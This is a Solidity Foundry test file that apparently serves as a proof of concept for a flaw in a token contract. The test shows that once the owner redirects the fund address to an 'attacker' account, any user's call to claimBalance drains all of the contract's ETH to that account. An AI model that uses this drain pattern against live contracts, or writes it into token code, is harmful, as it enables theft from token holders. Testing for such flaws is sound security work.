// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/RebaseDividendToken.sol";

contract MockRouter {
    function factory() external pure returns (address) {
        return address(0x1234567890123456789012345678901234567891);
    }

    function WETH() external pure returns (address) {
        return address(0x55d398326f99059fF775485246999027B3197955);
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x1);
    }
}

contract MockNFT {}

contract RebaseDividendTokenTest is Test {
    RebaseDividendToken token;
    address owner;
    address attacker;
    address user;
    
    // Addresses from token's fixed constructor parameters
    address constant FUND_ADDRESS = 0xDfb0F1770bA484860DAdf62B955b26411b31552A;
    address constant NFT_ADDRESS = 0xa9E8bb064EC31c2d3505c770D3804C16C1aEd911; // Fixed checksum
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant FACTORY_MOCK_ADDRESS = 0x1234567890123456789012345678901234567891;

    function setUp() public {
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        user = makeAddr("user");
        
        // Mock required contracts
        vm.etch(ROUTER_ADDRESS, address(new MockRouter()).code);
        vm.etch(FACTORY_MOCK_ADDRESS, address(new MockFactory()).code);
        vm.etch(NFT_ADDRESS, address(new MockNFT()).code);

        // Deploy token with no-arg constructor
        vm.prank(owner);
        token = new RebaseDividendToken();
        
        // Fund token contract with ETH
        vm.deal(address(token), 10 ether);
    }

    function testArbitraryEthTransfer() public {
        // Record initial balances
        uint256 tokenBalanceBefore = address(token).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        
        console.log("--- BEFORE TRIGGER STATE ---");
        console.log("Contract ETH balance:", tokenBalanceBefore);
        console.log("Attacker ETH balance:", attackerBalanceBefore);
        
        // Change fund address to attacker (owner has permissions)
        vm.prank(owner);
        token.setFundAddress(attacker);
        
        console.log("--- TRIGGER ACTION: claimBalance ---");
        vm.prank(user);
        token.claimBalance();
        
        // Record post-trigger balances
        uint256 tokenBalanceAfter = address(token).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        
        console.log("--- AFTER TRIGGER STATE ---");
        console.log("Contract ETH balance:", tokenBalanceAfter);
        console.log("Attacker ETH balance:", attackerBalanceAfter);
        
        // Calculate balance differences
        uint256 contractLoss = tokenBalanceBefore - tokenBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("--- STATE CHANGE ANALYSIS ---");
        console.log("Contract balance reduction:", contractLoss);
        console.log("Attacker balance increase: ", attackerGain);
        
        // Determine vulnerability existence
        bool contractDrained = tokenBalanceAfter == 0;
        bool fundsTransferred = contractLoss == tokenBalanceBefore;
        bool attackerReceivedFunds = attackerGain == tokenBalanceBefore;
        
        if (contractDrained && fundsTransferred && attackerReceivedFunds) {
            console.log("Vulnerability Exists: User successfully transferred contract ETH to attacker");
        } else {
            console.log("Vulnerability not Exist: Contract funds not fully transferred to attacker");
        }
        
        // Validate state changes
        assertEq(tokenBalanceAfter, 0, "Contract ETH not drained");
        assertEq(attackerBalanceAfter, attackerBalanceBefore + tokenBalanceBefore, "Attacker didn't receive ETH");
    }
}